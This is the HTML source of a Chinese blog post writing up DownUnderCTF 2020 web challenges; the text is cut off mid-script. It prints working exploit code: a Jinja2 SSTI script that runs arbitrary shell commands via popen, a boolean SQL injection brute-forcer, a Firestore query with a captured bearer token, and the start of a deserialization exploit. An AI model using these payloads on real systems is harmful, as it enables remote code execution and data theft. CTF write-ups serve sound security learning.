@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="官方 writeup 地址：https:&#x2F;&#x2F;github.com&#x2F;DownUnderCTF&#x2F;Challenges_2020_public题目地址：https:&#x2F;&#x2F;play.duc.tf&#x2F;challenges 太菜了，比赛结束才把模版注入那个题搞定(唯一做出来的题目)。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020年9月DownUnderCTF">
+<meta property="og:url" content="http://example.com/2020/09/30/2020%E5%B9%B49%E6%9C%88DownUnderCTF/index.html">
+<meta property="og:site_name" content="slug01sh&#39;s blog">
+<meta property="og:description" content="官方 writeup 地址：https:&#x2F;&#x2F;github.com&#x2F;DownUnderCTF&#x2F;Challenges_2020_public题目地址：https:&#x2F;&#x2F;play.duc.tf&#x2F;challenges 太菜了，比赛结束才把模版注入那个题搞定(唯一做出来的题目)。">
+<meta property="og:locale">
+<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png">
+<meta property="article:published_time" content="2020-09-30T02:05:03.000Z">
+<meta property="article:modified_time" content="2020-09-30T02:45:21.000Z">
+<meta property="article:author" content="slug01sh">
+<meta property="article:tag" content="生活">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="编程">
+<meta property="article:tag" content="英语">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png">
+
+<link rel="canonical" href="http://example.com/2020/09/30/2020%E5%B9%B49%E6%9C%88DownUnderCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>2020年9月DownUnderCTF | slug01sh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">slug01sh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Think with the world</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/30/2020%E5%B9%B49%E6%9C%88DownUnderCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="slug01sh">
+      <meta itemprop="description" content="欢迎大家发表自己的见解与评价">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="slug01sh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020年9月DownUnderCTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-09-30 10:05:03 / Modified: 10:45:21" itemprop="dateCreated datePublished" datetime="2020-09-30T10:05:03+08:00">2020-09-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>官方 writeup 地址：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public">https://github.com/DownUnderCTF/Challenges_2020_public</a><br>题目地址：<a target="_blank" rel="noopener" href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a></p>
+<p>太菜了，比赛结束才把模版注入那个题搞定(唯一做出来的题目)。</p>
+<hr>
+<a id="more"></a>
+
+<h1 id="Web-Badmin（DNS配置）"><a href="#Web-Badmin（DNS配置）" class="headerlink" title="Web Badmin（DNS配置）"></a>Web Badmin（DNS配置）</h1><p>题目：web badmin</p>
+<p>提示：We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP</p>
+<p>视频上方：me rn。windows</p>
+<p>注释：<code>&lt;!-- &lt;a href=&quot;https://epicgame.play.duc.tf&quot;&gt;Play our new game here!&lt;/a&gt; --&gt;</code>，注释中的网站无法打开</p>
+<p>beep boop：哔哔声</p>
+<p>没有cookie</p>
+<p>hint：Boss: we are firing you. The game doesn’t even load. Web admin: it was just a simple misconfiguration, i clicked the wrong button 😞</p>
+<p>发现注释中有提示信息，使用浏览器、ping工具、curl工具（几种常用的工具）都没有任何响应，束手无策。</p>
+<p>最后查看题解才知道，无法连接是由于DNS的原因，使用dig、host即可获得flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host -t txt epicgame.play.duc.tf</span><br><span class="line"></span><br><span class="line">dig epicgame.play.duc.tf TXT         <span class="comment"># dig 命令主要用来从 DNS 域名服务器查询主机地址信息。</span></span><br></pre></td></tr></table></figure>
+
+<p>在 DNS 协议中有很多的资源协议类型，TXT 属于其中一种。</p>
+<ul>
+<li>A记录 - 保存域的IP地址的记录。</li>
+<li>CNAME记录 - 将一个域或子域转发到另一个域，不提供IP地址。</li>
+<li>MX记录 - 将邮件定向到电子邮件服务器。</li>
+<li>TXT记录 - 允许管理员在记录中存储文本注释。</li>
+<li>NS记录 - 存储DNS条目的名称服务器。</li>
+<li>SRV记录 - 指定特定服务的端口。</li>
+</ul>
+<hr>
+<h1 id="Robotsss（SSTI）"><a href="#Robotsss（SSTI）" class="headerlink" title="Robotsss（SSTI）"></a>Robotsss（SSTI）</h1><p>题目地址：<a target="_blank" rel="noopener" href="https://chal.duc.tf:30106/">https://chal.duc.tf:30106/</a><br>Us robot devs use better templates than those stupid humans!</p>
+<p>注册并登陆系统，可以得到两个提示信息。第一个信息暗示 humans.txt 中有其他信息（<code>dirsearch</code> 工具也可以扫到），第二个提示暗示 flag 位于 /s3cr3t_p4th/robot_fl4g.txt。在第一个提示的源码中有一串二进制码，解码可得 humen.txt（二进制转ascii），第二篇文章的二进制解码得 fl4g.txt。</p>
+<p>根据第一个暗示我们找到另一个地址(<a target="_blank" rel="noopener" href="https://chal.duc.tf:30106/4dm1n_Cr3ds)%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%BB%99%E5%87%BA%E4%B8%80%E6%AE%B5">https://chal.duc.tf:30106/4dm1n_Cr3ds)，这个地址给出一段</a> admin credit 为 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</p>
+<p>访问 humen.txt 地址发现一张图片，使用 <code>strings</code> 工具处理图片（<code>binwalk</code>、<code>foremost</code> 都测试过），得到一串二进制码011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001，解码得到 admin:This-Is-The-Admin-Password-XD!，看上去很像是账号密码。</p>
+<p>使用 admin 账号登陆成功。前几天做了很多命令注入的题目（<code>Python</code>、<code>Java</code>），以为这个题目还是命令注入，最后发现是模版注入。并且还在控制台发现：Werkzeug/0.16.0 Python/3.7.9。</p>
+<p>测试代码</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;                  =&gt; jinja2 </span><br><span class="line">&#x27;a&#x27;&#x27;a&#x27;                   =&gt; shell </span><br><span class="line">&#x27;a&#x27;.length               =&gt; js </span><br><span class="line">len(&#x27;a&#x27;)                 =&gt; python </span><br><span class="line">&#x27;a&#x27;.charAt(0)            =&gt; java</span><br><span class="line"></span><br><span class="line">&#123;&#123;1+1&#125;&#125;                  =&gt; 模版注入</span><br></pre></td></tr></table></figure>
+
+<p>最后根据漏洞特性构造 exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    get_para = <span class="string">&#x27;a=__class__&amp;&amp;b=__mro__&amp;&amp;c=__getitem__&amp;&amp;d=__subclasses__&amp;&amp;e=__init__&amp;&amp;f=__globals__&#x27;</span></span><br><span class="line">    <span class="comment"># get_para = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># post_para = input(&#x27;POST:&#x27;)</span></span><br><span class="line">    cmd = input(<span class="string">&#x27;cmd:&#x27;</span>)</span><br><span class="line">    post_para = <span class="string">&quot;&#123;&#123; &#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1)|attr(request.args.d)()|attr(request.args.c)(127)|attr(request.args.e)|attr(request.args.f)|attr(request.args.c)(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;)|attr(&#x27;read&#x27;)() &#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">&#x27;https://chal.duc.tf:30106/admin.php?&#x27;</span> + get_para</span><br><span class="line"></span><br><span class="line">    resp = requests.post(</span><br><span class="line">        url=base_url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;user_in&#x27;</span>: <span class="string">&#x27;&#x27;</span> + post_para + <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;.eJwlzjsOwjAMANC7eO5gO4kT9zJV4o9gbemEuDtIrG96bzjyjOsB--u8Y4Pj6bDDGNU4F7EnEkntWEiwhok3CfyJUS_ckigxQ1pxr5pNcxrqIp_K4itqFF02zSZLH73ZQPeCGD2YURZiGaJ1tjXWbEO465wFFTa4rzj_GYLPF1GiLjY.X2bocA.l7FpHpE9qJ_HHpRBtjQGgDwGd0Y&#x27;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(markup=resp.content, features=<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;result: <span class="subst">&#123;soup.find(<span class="string">&quot;p&quot;</span>).get_text()&#125;</span>&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;-------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功 getshell，并得到 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png"></p>
+<p>官方题解：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss</a></p>
+<p>通过题解可知，6zMLV46JRp6kAmTs3nx5AG4WJgYeY 为 <code>base58</code> 编码，可以通过 <code>&#123;&#123; config.items() &#125;&#125;</code> 查看系统配置信息，配置信息中的函数用于暗示该函数可以使用。还可以使用 Jinja 自带的语法（<code>&#123;&#123; getFile("/fl4g.txt") &#125;&#125;</code>）来读取 flag 文件。</p>
+<hr>
+<h1 id="Cookie-Clicker（逻辑漏洞）"><a href="#Cookie-Clicker（逻辑漏洞）" class="headerlink" title="Cookie Clicker（逻辑漏洞）"></a>Cookie Clicker（逻辑漏洞）</h1><p>题目地址：<a target="_blank" rel="noopener" href="https://cookie-clicker1.web.app/">https://cookie-clicker1.web.app/</a></p>
+<p>Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didn’t need to worry about security because it’s all handled by Google :) just click cookies and enjoy</p>
+<p>WriteUp：我从题目中提取到的关键词是 epic Firebase，Flag 可能和 Firebase 有关。将相关简单流程操作了一下，并未发现异常情况（看了一下请求参数，太复杂了）。题目中还涉及 Google，心生敬畏之心，简单查看源文件之后果断放弃（这种大型网站从来没做过。</p>
+<p>官方题解：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md</a></p>
+<p>题解地址：<a target="_blank" rel="noopener" href="https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker">https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker</a></p>
+<p>查看题解过后发现第一步的思路是正确的，但是没有去搜索 Firebase。Firestore 是一个数据库服务，并且 WriteUp 提到「Firebase 有一个关键的安全问题——设置访问控制，否则任意用户都能访问数据」。</p>
+<blockquote>
+<p>note：大型服务商（Google）提供的服务通常的问题都出在配置问题。（不然早就修复了</p>
+</blockquote>
+<p>然后观察题目发送的请求（注意观察存在关键词的请求），第一次请求和后面的请求不相同，通常应该联想到第一次请求是在申请授权。按照 <a target="_blank" rel="noopener" href="https://firebase.google.com/docs/firestore/use-rest-api">Cloud Firestore API</a> 的教程，使用申请授权的信息向 Firebase 进行验证即可得到 flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -H <span class="string">&quot;Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g&quot;</span> <span class="string">&quot;https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>官方的 writeup 则是使用 firestore 在源码中搜索能找到登陆的关键凭证，但后面的步骤就很难联想到。（这个题脑洞是真滴大</p>
+<hr>
+<h1 id="CicleSpace（SQL注入）"><a href="#CicleSpace（SQL注入）" class="headerlink" title="CicleSpace（SQL注入）"></a>CicleSpace（SQL注入）</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://chal.duc.tf:30103/">https://chal.duc.tf:30103/</a></p>
+<p>Oh, how I miss /r/place and /r/circleoftrust. That’s why I decided to create my own one for y’all to play with.<br>/* some bruteforce may be required */</p>
+<p>猜测为SQL注入，但是没有成功注入。发送空数据时，返回报错（400）。</p>
+<p>题解链接：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md</a></p>
+<p>查看题解后发现，fuzz SQL注入时，最好把自己写入的参数删掉（参数为空）。参考题解的 payload，添加名为 1 的 Person，然后再分别使用：<code>1&quot; AND 1=0  #</code>，<code>1&quot; AND 1=1  #</code> 进行查询，即可发现为 Boolean 注入，然后使用 Boolean 注入的方法进行爆破即可。（使用 <code>2&quot; # </code> 也能查出来）</p>
+<blockquote>
+<p>细心一点测试，这个题应该能做（</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARSET = list(string.ascii_lowercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">url: str, sql: str, result: list, charset=CHARSET, current=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        r = s.get(url, params=&#123;<span class="string">&quot;name&quot;</span>: sql.format(current + i + <span class="string">&quot;%&quot;</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is not part&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            res = query(url, sql, result, charset=charset, current=current + i)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                result.append(current + i)</span><br><span class="line">    <span class="keyword">return</span> found</span><br><span class="line">      </span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="comment"># create a circle</span></span><br><span class="line">r = s.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/create&quot;</span>, data=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lol&quot;</span>&#125;)</span><br><span class="line">circle_url = r.url</span><br><span class="line"></span><br><span class="line"><span class="comment"># find the right table</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span>():</span></span><br><span class="line">    q = <span class="string">&#x27;&quot; AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type=&quot;BASE TABLE&quot; AND table_schema=&quot;circlespace&quot; AND table_name LIKE &quot;&#123;&#125;&quot; -- a&#x27;</span></span><br><span class="line">    tables = []</span><br><span class="line">    query(<span class="string">f&quot;<span class="subst">&#123;circle_url&#125;</span>/people&quot;</span>, q, tables)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line">print(get_tables())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="Taking-Stock（Python序列化）"><a href="#Taking-Stock（Python序列化）" class="headerlink" title="Taking Stock（Python序列化）"></a>Taking Stock（Python序列化）</h1><p>题目地址：<a target="_blank" rel="noopener" href="https://chal.duc.tf:30104/">https://chal.duc.tf:30104/</a></p>
+<p>After taking one unit of AI at uni I’m now a pro. My linear regression model is amazing at predicting the stock market. I’m so proud of it I’m even offering it as a service. Can’t wait to get that VC money!</p>
+<p>题解链接：<a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock</a></p>
+<p>登陆后可以发现，Profile Picture 泄漏了 uuid。解码 session 后获得 <code>&#123;&quot;id&quot;:&quot;74795b25-010e-4fca-9e7b-ae05a000d089&quot;,&quot;username&quot;:&quot;1&quot;&#125;_q?G??&#39;1v8aF??j?????&gt;p?4</code>。和图片的 uuid（<code>&lt;img src=&quot;/profile-picture/74795b25-010e-4fca-9e7b-ae05a000d089&quot; alt=&quot;Profile Picture&quot;&gt;</code>） 相同。</p>
+<p>在 stock 位置有目录穿越，也就意味着 joblib 反序列时，可以指定为自己上传的文件。</p>
+<p>基本思路：构建 payload（命令执行结果写回文件） -&gt; 命令序列化后存入文件 -&gt; 将文件做为头像传入系统 -&gt; 在 stock 处反序列化上传的文件 -&gt; 读取头像。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64Padding</span>(<span class="params">data</span>):</span></span><br><span class="line">    missing_padding = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding:</span><br><span class="line">        data += <span class="string">&#x27;=&#x27;</span> * missing_padding</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">REMOTE = <span class="string">&#x27;https://chal.duc.tf:30104/&#x27;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 登陆</span></span><br><span class="line">resp = session.post(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/login&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;hacker&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2。 获取 Cookie</span></span><br><span class="line">token = json.loads(</span><br><span class="line">    b64.b64decode(base64Padding(session.cookies[<span class="string">&#x27;session&#x27;</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])).decode()</span><br><span class="line">)</span><br><span class="line">uid = token[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">resp = session.get(<span class="string">f&#x27;<span class="subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="subst">&#123;uid&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">remote_path = resp.text.split(<span class="string">&#x27; &#x27;</span>)[<span 